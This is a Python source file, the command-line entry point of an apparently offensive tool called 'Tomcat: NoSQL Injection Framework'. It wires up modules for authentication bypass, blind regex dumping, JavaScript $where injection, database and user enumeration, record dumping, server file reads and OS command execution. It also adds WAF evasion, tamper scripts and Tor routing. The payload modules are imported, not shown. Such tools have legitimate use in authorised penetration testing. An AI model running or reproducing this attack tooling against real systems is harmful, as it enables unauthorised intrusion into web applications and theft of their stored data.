import argparse
import sys
import json
import re
import random
import os
from urllib.parse import parse_qsl
import importlib
from typing import List
from core.logger import Logger
from core.parser import RequestParser
from core.requester import Requester
# from core.reporter import Reporter

# Import Injection Modules
from modules.injection.auth_bypass import AuthBypass
from modules.injection.blind_dumper import BlindDumper
from modules.injection.js_injection import JSInjection

# Import Detection & Enumeration Modules
from modules.detection.fingerprint import Fingerprint
from modules.enumeration.dbs import DatabaseEnumerator
from modules.enumeration.collections import CollectionEnumerator
from modules.enumeration.dump import DataDumper
from modules.enumeration.users import UserEnumerator

# Import Post-Exploitation Modules
from modules.post_exploitation.file_system import FileSystem
from modules.post_exploitation.shell import ServerShell


def list_tampers():
    """List all available tamper scripts with brief descriptions."""
    Logger.info("Listing available tamper scripts...")

    base_dir = os.path.dirname(os.path.abspath(__file__))
    tamper_dir = os.path.join(base_dir, "modules", "tamper")

    if not os.path.exists(tamper_dir):
        Logger.error(f"Tamper directory not found: {tamper_dir}")
        return

    files = [f[:-3] for f in os.listdir(tamper_dir) if f.endswith(".py") and f != "__init__.py"]

    if not files:
        Logger.warning("No tamper scripts found.")
        return

    print("\n" + "=" * 80)
    print(f"{'Tamper Name':<30} | {'Description'}")
    print("=" * 80)

    for name in sorted(files):
        try:
            module = importlib.import_module(f"modules.tamper.{name}")
            desc = "No description provided."

            if hasattr(module, "tamper") and module.tamper.__doc__:
                doc_lines = [line.strip() for line in module.tamper.__doc__.split("\n") if line.strip()]
                if doc_lines:
                    desc = " | ".join(doc_lines[:3])
            elif module.__doc__:
                doc_lines = [line.strip() for line in module.__doc__.split("\n") if line.strip()]
                if doc_lines:
                    desc = " | ".join(doc_lines[:3])

            print(f"{name:<30} | {desc}")
        except Exception as e:
            print(f"{name:<30} | [Error loading script: {e}]")

    print("=" * 80 + "\n")
    example_usage = f'--tamper="{files[0]},{files[1] if len(files) > 1 else "name"}"' if files else '--tamper="name"'
    print(f"Usage example: {example_usage}\n")


def _split_csv_argument(arg: str) -> List[str]:
    """Split comma-separated CLI arguments into a cleaned list."""
    if not arg:
        return []
    return [part.strip() for part in arg.split(",") if part.strip()]


def main():
    # Show Banner
    Logger.banner()

    # Setup Command Line Arguments
    parser = argparse.ArgumentParser(description="Tomcat: NoSQL Injection Framework")

    # Input group
    input_group = parser.add_mutually_exclusive_group()
    input_group.add_argument("-r", "--request", help="Load HTTP request from a file (.req)")
    input_group.add_argument("-u", "--url", help="Target URL (Manual Mode)")

    # Manual mode arguments
    parser.add_argument("-d", "--data", help='Data string (JSON or key=value)')
    parser.add_argument("-m", "--method", default="POST", help="HTTP Method (Default: POST)")

    # General settings
    parser.add_argument("-t", "--threads", type=int, default=1, help="Max number of concurrent threads")
    parser.add_argument("--random-agent", action="store_true", help="Use a random User-Agent from user-agents.txt")
    parser.add_argument("--proxy", help="Use an HTTP/SOCKS proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--tor", action="store_true", help="Route traffic through Tor (SOCKS5 on 127.0.0.1:9050)")
    parser.add_argument("--delay", type=float, default=0, help="Time delay between requests (seconds).")

    # --- Connection Tuning ---
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds (Default: 10)")
    parser.add_argument("--retries", type=int, default=3, help="Max retries on connection failure (Default: 3)")
    parser.add_argument("--time-sec", type=int, help="Seconds to sleep for time-based attacks (Overrides auto-calibration)")
    
    # --- Auto-Login Arguments ---
    parser.add_argument("--auth-url", help="Login URL for auto-reauthentication")
    parser.add_argument("--auth-data", help="Login JSON Data (e.g. '{\"user\":\"admin\",\"pass\":\"123\"}')")

    # --- WAF Evasion (New) ---
    parser.add_argument("--impersonate", default="chrome120", help="Browser to impersonate (chrome120, safari15_3, firefox117). Default: chrome120")

    # Tamper scripts
    parser.add_argument("--tamper", help="Comma-separated list of tamper scripts")
    parser.add_argument("--list-tampers", action="store_true", help="List all available tamper scripts and exit")

    # --- Injection Tuning ---
    parser.add_argument("--prefix", default="", help="Injection payload prefix string (e.g. \')")
    parser.add_argument("--suffix", default="", help="Injection payload suffix string (e.g. //)")
    
    # --- Technique Selection ---
    parser.add_argument("-p", "--param", help="Test only this specific parameter")

    parser.add_argument(
        "--technique",
        default="ABJ",
        help="Specify injection techniques to use (default: ABJ)\n"
             "A: Auth Bypass ($ne, $gt)\n"
             "B: Blind Injection (Regex/Binary)\n"
             "J: JS Injection ($where, Time-based)"
    )

    # Enumeration flags
    parser.add_argument("--dbs", action="store_true", help="Enumerate DBMS databases")
    parser.add_argument("--collections", action="store_true", help="Enumerate DBMS collections (tables)")
    parser.add_argument("--users", action="store_true", help="Enumerate DBMS users")
    parser.add_argument("--dump", action="store_true", help="Dump DBMS database table entries")

    # Post-Exploitation flags
    parser.add_argument("--file-read", help="Read a file from the server file system")
    parser.add_argument("--os-cmd", help="Execute an operating system command")

    # Target specifications for dump
    parser.add_argument("-D", "--db", help="DBMS database to enumerate")
    parser.add_argument("-T", "--table", help="DBMS database table(s) to enumerate")
    parser.add_argument("-C", "--columns", help="DBMS database table column(s) to enumerate (comma-separated)")

    args = parser.parse_args()

    # --- Check for List Tampers ---
    if args.list_tampers:
        list_tampers()
        sys.exit(0)

    # --- Validation for Input ---
    if not args.request and not args.url:
        parser.error("one of the arguments -r/--request or -u/--url is required")

    # Final variables passed to the engine
    target_url = ""
    target_method = "POST"
    target_headers = {}
    target_json = {}

    # Extraction of settings
    proxy_setting = args.proxy
    tor_setting = args.tor
    request_delay = args.delay
    tamper_scripts_raw = args.tamper
    tamper_list = _split_csv_argument(tamper_scripts_raw)
    target_param = args.param
    
    inj_prefix = args.prefix
    inj_suffix = args.suffix
    conn_timeout = args.timeout
    conn_retries = args.retries
    time_sec = args.time_sec
    impersonate_browser = args.impersonate

    auth_url = args.auth_url
    auth_data_raw = args.auth_data
    auth_data = None
    if auth_data_raw:
        try:
            auth_data = json.loads(auth_data_raw)
        except:
            auth_data = auth_data_raw 
    # ----------------------------------------------------

    # --- Step 1: Input Handling ---
    if args.request:
        Logger.info(f"Reading request file: {args.request}")
        req_parser = RequestParser()
        target_url, target_method, target_headers, target_json = req_parser.parse_file(args.request)

    elif args.url:
        target_url = args.url
        target_method = args.method.upper()

        if args.data:
            data_input = args.data.strip("'")
            try:
                target_json = json.loads(data_input)
                target_headers["Content-Type"] = "application/json"
            except json.JSONDecodeError:
                if "=" in data_input:
                    target_json = dict(parse_qsl(data_input))
                    if target_method == "POST":
                        target_headers["Content-Type"] = "application/x-www-form-urlencoded"
                else:
                    Logger.error("Input data format not recognized (Must be JSON or key=value).")
                    sys.exit(1)
        elif target_method == "GET":
             from urllib.parse import urlparse
             parsed = urlparse(target_url)
             if parsed.query:
                 target_json = dict(parse_qsl(parsed.query))
        
        if not target_json and not args.os_cmd and not args.file_read:
             Logger.warning("No input parameters found to inject.")

        if "User-Agent" not in target_headers:
            target_headers["User-Agent"] = "Tomcat/Manual-Mode"

    # --- Random User-Agent Logic ---
    if args.random_agent:
        try:
            ua_file_path = os.path.join(os.path.dirname(__file__), "user-agents.txt")
            if not os.path.exists(ua_file_path):
                ua_file_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "user-agents.txt")

            with open(ua_file_path, "r") as f:
                agents = [line.strip() for line in f.readlines() if line.strip()]

            if agents:
                selected_ua = random.choice(agents)
                target_headers["User-Agent"] = selected_ua
                Logger.info(f"Random User-Agent selected: {selected_ua[:60]}...")
            else:
                Logger.warning("user-agents.txt is empty! Using default UA.")
        except FileNotFoundError:
            Logger.error("File 'user-agents.txt' not found! Please create it.")
        except Exception as e:
            Logger.warning(f"Could not load user-agents file: {e}")

    Logger.info(f"Target identified: {target_url}")
    Logger.info(f"Method: {target_method}")

    # --- Initialize Reporter ---
    # reporter = Reporter(target_url, target_method, target_json)

    if proxy_setting or tor_setting:
        Logger.info(f"Proxy Active: {proxy_setting or 'Tor'}")

    if tamper_list:
        Logger.info(f"Tamper scripts loaded: {', '.join(tamper_list)}")
        
    Logger.info(f"Impersonating Browser: {impersonate_browser}") 


    # Step 2: Setup Requester Engine
    requester = Requester(
        headers=target_headers,
        proxy=proxy_setting,
        is_tor=tor_setting,
        global_delay=request_delay,
        tamper_list=",".join(tamper_list) if tamper_list else "",
        timeout=conn_timeout,
        retries=conn_retries,
        auth_url=auth_url,
        auth_data=auth_data,
        impersonate=impersonate_browser 
    )

    # Step 3: Baseline Connection Test
    Logger.info("Sending baseline request to check server status...")
    baseline_response = requester.send(target_url, target_method, target_json)

    if baseline_response is not None:
        status_code = baseline_response.status_code

        if 200 <= status_code < 300:
            Logger.success(f"Connection established! Status code: {status_code}")
        elif status_code in (401, 403):
            Logger.warning(f"Connection established but access denied ({status_code}). This might be a false negative.")
        elif status_code >= 500:
            Logger.warning(f"Server Error ({status_code}). Target might be unstable.")
        else:
            Logger.info(f"Server responded with status: {status_code}")

        try:
            resp_len = len(baseline_response.text)
        except Exception:
            resp_len = 0
        Logger.info(f"Response length: {resp_len} bytes")

        # --- Step 4: Detection Phase ---
        print("\n")
        Logger.info("Starting Detection Phase...")

        # 1. Fingerprint Database
        fingerprinter = Fingerprint(requester, target_url, target_method, target_json, baseline_response, time_sec=time_sec)
        db_type = fingerprinter.run()

        # --- Step 5: Attack Phase ---
        print("\n")

        # Common Params dictionary
        common_params = {
            "requester": requester,
            "url": target_url,
            "method": target_method,
            "original_data": target_json,
            "baseline_response": baseline_response,
            "threads": args.threads,
            "db_type": db_type,
            "prefix": inj_prefix,
            "suffix": inj_suffix,
            "time_sec": time_sec,
            "retries": conn_retries
        }

        # Mode: OS Command Execution
        if args.os_cmd:
            Logger.info("OS Command Injection Mode Enabled")
            shell_module = ServerShell(requester, target_url, target_method, target_json, baseline_response)
            shell_module.run(args.os_cmd)

        # Mode: File Read
        elif args.file_read:
            Logger.info("File Read Mode Enabled")
            fs_module = FileSystem(**common_params)
            fs_module.run(args.file_read)

        # Enumeration / Dump Modes
        elif args.dump:
            if "MongoDB" in db_type or "Generic" in db_type:
                if not args.db or not args.table or not args.columns:
                    Logger.error("Database (-D), Collection (-T), and Columns (-C) are required for dumping.")
                    sys.exit(1)

                Logger.info("Data Dump Mode Enabled (--dump)")
                columns = _split_csv_argument(args.columns)
                dumper = DataDumper(
                    **common_params,
                    db=args.db,
                    collection=args.table,
                    columns=columns
                )
                dumper.run()
            else:
                Logger.error(f"Data dumping not fully supported for '{db_type}' yet.")

        elif args.dbs:
            if "MongoDB" in db_type or "Generic" in db_type:
                Logger.info("Enumeration Mode Enabled (--dbs)")
                enum_db = DatabaseEnumerator(**common_params)
                enum_db.run()
            else:
                Logger.error(f"Enumeration not fully supported for '{db_type}' yet.")

        elif args.collections:
            if "MongoDB" in db_type or "Generic" in db_type:
                Logger.info("Enumeration Mode Enabled (--collections)")
                enum_col = CollectionEnumerator(**common_params)
                enum_col.run()
            else:
                Logger.error(f"Collection enumeration not supported for '{db_type}' yet.")

        elif args.users:
            if "MongoDB" in db_type or "Generic" in db_type:
                Logger.info("Enumeration Mode Enabled (--users)")
                enum_user = UserEnumerator(**common_params)
                enum_user.run()
            else:
                Logger.error(f"User enumeration not fully supported for '{db_type}' yet.")

        # Mode: Default Attack (Injection Check)
        else:
            tech = (args.technique or "ABJ").upper()
            Logger.info(f"Loading Injection Modules (Techniques: {tech})...")

            # A: Auth Bypass
            if "A" in tech:
                try:
                    Logger.info("Running Auth Bypass module...")
                    ab_module = AuthBypass(requester, target_url, target_method, target_json, baseline_response, target_param=target_param)
                    ab_module.run()
                except Exception as e:
                    Logger.error(f"AuthBypass failed: {e}")

            # J: JS Injection
            if "J" in tech:
                if "CouchDB" in db_type:
                    Logger.info("Skipping JS Injection for CouchDB targets.")
                else:
                    try:
                        print("\n")
                        Logger.info("Running JS Injection module...")
                        js_module = JSInjection(requester, target_url, target_method, target_json, baseline_response, target_param=target_param, prefix=inj_prefix, suffix=inj_suffix, time_sec=time_sec)
                        js_module.run()
                    except Exception as e:
                        Logger.error(f"JSInjection failed: {e}")

            # B: Blind Dumper
            if "B" in tech:
                try:
                    print("\n")
                    Logger.info("Running Blind Dumper module...")
                    dumper_module = BlindDumper(
                        requester, target_url, target_method, target_json, baseline_response, 
                        threads=args.threads, target_param=target_param, 
                        prefix=inj_prefix, suffix=inj_suffix,
                        time_sec=time_sec, retries=conn_retries
                    )
                    dumper_module.run()
                except Exception as e:
                    Logger.error(f"BlindDumper failed: {e}")
        
        print("\n")

    else:
        Logger.error("Connection to target failed (Network Error/Timeout).")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n")
        Logger.error("Stopped by user.")
